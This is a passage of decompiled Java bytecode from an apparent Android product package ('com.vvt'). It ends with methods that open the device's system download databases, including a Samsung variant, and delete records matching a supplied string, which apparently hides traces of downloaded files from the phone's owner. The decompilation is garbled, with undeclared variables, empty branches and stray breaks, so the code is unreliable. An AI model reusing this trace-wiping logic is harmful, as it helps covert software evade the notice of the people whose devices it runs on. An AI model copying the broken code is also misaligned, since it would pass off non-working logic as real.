    //   631: astore 19
    //   633: goto -128 -> 505
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	636	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	636	1	paramString1	String
    //   0	636	2	paramString2	String
    //   0	636	3	paramContext	Context
    //   1	517	4	bool1	boolean
    //   10	251	5	bool2	boolean
    //   277	3	5	i	int
    //   301	3	5	bool3	boolean
    //   321	53	5	j	int
    //   444	185	5	bool4	boolean
    //   19	602	6	str1	String
    //   23	594	7	str2	String
    //   26	593	8	localObject1	Object
    //   29	186	9	bool5	boolean
    //   32	479	10	localObject2	Object
    //   35	188	11	k	int
    //   38	188	12	arrayOfObject	Object[]
    //   41	147	13	m	int
    //   44	191	14	str3	String
    //   47	382	15	bool6	boolean
    //   50	349	16	str4	String
    //   53	339	17	bool7	boolean
    //   57	17	18	str5	String
    //   60	401	19	localObject3	Object
    //   471	1	19	localException1	Exception
    //   475	29	19	localObject4	Object
    //   536	26	19	localObject5	Object
    //   567	1	19	localObject6	Object
    //   572	1	19	localObject7	Object
    //   577	1	19	localException2	Exception
    //   583	49	19	localObject8	Object
    //   63	501	20	localObject9	Object
    //   588	1	20	localException3	Exception
    //   604	19	20	str6	String
    //   98	27	21	n	int
    //   480	60	21	bool8	boolean
    //   147	7	22	localObject10	Object
    //   559	7	22	localObject11	Object
    //   332	120	23	l	long
    // Exception table:
    //   from	to	target	type
    //   247	255	471	java/lang/Exception
    //   255	258	471	java/lang/Exception
    //   270	277	471	java/lang/Exception
    //   284	287	471	java/lang/Exception
    //   289	294	471	java/lang/Exception
    //   294	301	471	java/lang/Exception
    //   314	321	471	java/lang/Exception
    //   325	332	471	java/lang/Exception
    //   336	343	471	java/lang/Exception
    //   347	354	471	java/lang/Exception
    //   362	369	471	java/lang/Exception
    //   373	380	471	java/lang/Exception
    //   384	389	471	java/lang/Exception
    //   398	403	471	java/lang/Exception
    //   405	408	471	java/lang/Exception
    //   416	421	471	java/lang/Exception
    //   423	426	471	java/lang/Exception
    //   439	444	471	java/lang/Exception
    //   451	456	471	java/lang/Exception
    //   460	468	471	java/lang/Exception
    //   510	515	471	java/lang/Exception
    //   73	78	536	finally
    //   91	98	559	finally
    //   115	122	559	finally
    //   138	145	559	finally
    //   164	169	559	finally
    //   180	182	559	finally
    //   189	192	559	finally
    //   194	199	559	finally
    //   201	204	559	finally
    //   214	219	559	finally
    //   234	237	559	finally
    //   240	245	559	finally
    //   477	480	559	finally
    //   247	255	572	finally
    //   255	258	572	finally
    //   270	277	572	finally
    //   284	287	572	finally
    //   289	294	572	finally
    //   294	301	572	finally
    //   314	321	572	finally
    //   325	332	572	finally
    //   336	343	572	finally
    //   347	354	572	finally
    //   362	369	572	finally
    //   373	380	572	finally
    //   384	389	572	finally
    //   398	403	572	finally
    //   405	408	572	finally
    //   416	421	572	finally
    //   423	426	572	finally
    //   439	444	572	finally
    //   451	456	572	finally
    //   460	468	572	finally
    //   510	515	572	finally
    //   73	78	577	java/lang/Exception
    //   91	98	588	java/lang/Exception
    //   115	122	588	java/lang/Exception
    //   138	145	588	java/lang/Exception
    //   164	169	588	java/lang/Exception
    //   180	182	588	java/lang/Exception
    //   189	192	588	java/lang/Exception
    //   194	199	588	java/lang/Exception
    //   201	204	588	java/lang/Exception
    //   214	219	588	java/lang/Exception
    //   234	237	588	java/lang/Exception
    //   240	245	588	java/lang/Exception
  }
  
  private static boolean a(SQLiteDatabase paramSQLiteDatabase, String paramString, List paramList)
  {
    boolean bool1 = true;
    bool2 = a;
    if (bool2) {}
    String str1 = "_id = ? ";
    try
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool2 = localIterator.hasNext();
        if (!bool2) {
          break;
        }
        Object localObject1 = localIterator.next();
        localObject1 = (Long)localObject1;
        long l = ((Long)localObject1).longValue();
        bool2 = true;
        localObject1 = new String[bool2];
        String str2 = Long.toString(l);
        localObject1[0] = str2;
        paramSQLiteDatabase.delete(paramString, str1, (String[])localObject1);
        bool2 = b;
        if (!bool2) {}
      }
      bool2 = bool1;
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool2 = c;
        if (bool2) {}
        bool2 = false;
        Object localObject2 = null;
      }
    }
    return bool2;
  }
  
  public static boolean a(Boolean paramBoolean, String paramString)
  {
    boolean bool = paramBoolean.booleanValue();
    if (bool) {}
    for (bool = b(paramString);; bool = a(paramString)) {
      return bool;
    }
  }
  
  private static boolean a(String paramString)
  {
    return false;
  }
  
  public static boolean a(boolean paramBoolean, Context paramContext, String paramString)
  {
    boolean bool = false;
    String str = null;
    if (paramBoolean)
    {
      str = com.vvt.q.a.b.a.a(paramString);
      bool = a(paramContext, str);
    }
    return bool;
  }
  
  private static boolean b(String paramString)
  {
    boolean bool1 = false;
    String str1 = null;
    Object localObject1 = com.vvt.n.a.a("com.android.providers.downloads");
    Object localObject2;
    boolean bool2;
    String str2;
    if (localObject1 != null)
    {
      localObject1 = "com.android.providers.downloads";
      localObject2 = c.b((String)localObject1, "downloads.db");
      if (localObject2 != null)
      {
        bool2 = ((SQLiteDatabase)localObject2).isDbLockedByCurrentThread();
        if (!bool2)
        {
          bool2 = ((SQLiteDatabase)localObject2).isDbLockedByOtherThreads();
          if (!bool2) {}
        }
        else
        {
          bool2 = a;
          if ((!bool2) || (localObject2 != null)) {
            ((SQLiteDatabase)localObject2).close();
          }
          return bool1;
        }
        if (localObject2 != null)
        {
          bool2 = a;
          if (!bool2) {}
        }
        localObject1 = a((SQLiteDatabase)localObject2, "downloads", paramString);
        str2 = "downloads";
        bool2 = a((SQLiteDatabase)localObject2, str2, (List)localObject1);
        if (localObject2 != null) {
          ((SQLiteDatabase)localObject2).close();
        }
      }
    }
    for (;;)
    {
      localObject2 = com.vvt.n.a.a("com.sec.android.providers.downloads");
      if (localObject2 != null)
      {
        str2 = "sisodownloads.db";
        localObject2 = c.b("com.sec.android.providers.downloads", str2);
        if (localObject2 != null)
        {
          bool2 = ((SQLiteDatabase)localObject2).isDbLockedByCurrentThread();
          if (!bool2)
          {
            bool2 = ((SQLiteDatabase)localObject2).isDbLockedByOtherThreads();
            if (!bool2) {}
          }
          else
          {
            bool2 = a;
            if ((bool2) && (localObject2 == null)) {
              break;
            }
            ((SQLiteDatabase)localObject2).close();
            break;
          }
          if (localObject2 != null)
          {
            bool2 = a;
            if (!bool2) {}
          }
          localObject1 = a((SQLiteDatabase)localObject2, "sisodownloads", paramString);
          str1 = "sisodownloads";
          bool2 = a((SQLiteDatabase)localObject2, str1, (List)localObject1);
          if (localObject2 != null) {
            ((SQLiteDatabase)localObject2).close();
          }
        }
      }
      bool1 = bool2;
      break;
      bool2 = false;
      localObject1 = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/q/a/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */